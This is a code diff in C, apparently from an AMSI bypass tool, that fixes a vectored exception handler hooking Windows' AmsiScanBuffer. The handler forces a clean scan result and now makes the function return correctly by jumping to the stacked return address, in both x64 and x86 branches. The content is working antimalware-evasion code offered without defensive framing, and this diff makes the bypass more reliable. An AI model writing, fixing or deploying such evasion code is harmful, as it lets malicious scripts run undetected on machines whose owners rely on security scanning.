@@ -26,10 +26,13 @@ LONG WINAPI VEH2_ExceptionHandler(PEXCEPTION_POINTERS pExceptionInfo) {
             // Clear trap flag to prevent infinite loop
             pContext->EFlags &= ~0x100;
 
-            // Skip the actual AmsiScanBuffer execution by advancing RIP
-            // This makes AmsiScanBuffer return immediately with clean result
-            // Note: In production, calculate actual function size
-            pContext->Rip += 1; // Minimal increment, adjust based on disassembly
+            // Skip the actual AmsiScanBuffer execution
+            // IMPORTANT: Don't just increment by 1 - that jumps into middle of instruction stream
+            // Instead, set RIP to the return address on the stack (caller's address)
+            // This makes the function return immediately without executing
+            PVOID* pStackPointer = (PVOID*)pContext->Rsp;
+            pContext->Rip = (DWORD64)(*pStackPointer); // Set RIP to return address
+            pContext->Rsp += sizeof(PVOID); // Adjust stack pointer (pop return address)
 
             return EXCEPTION_CONTINUE_EXECUTION;
         }
@@ -38,7 +41,11 @@ LONG WINAPI VEH2_ExceptionHandler(PEXCEPTION_POINTERS pExceptionInfo) {
             // x86 version
             pContext->Eax = AMSI_RESULT_CLEAN;
             pContext->EFlags &= ~0x100;
-            pContext->Eip += 1;
+
+            // Set EIP to return address (same logic as x64)
+            PVOID* pStackPointer = (PVOID*)pContext->Esp;
+            pContext->Eip = (DWORD)(*pStackPointer);
+            pContext->Esp += sizeof(PVOID);
 
             return EXCEPTION_CONTINUE_EXECUTION;
         }
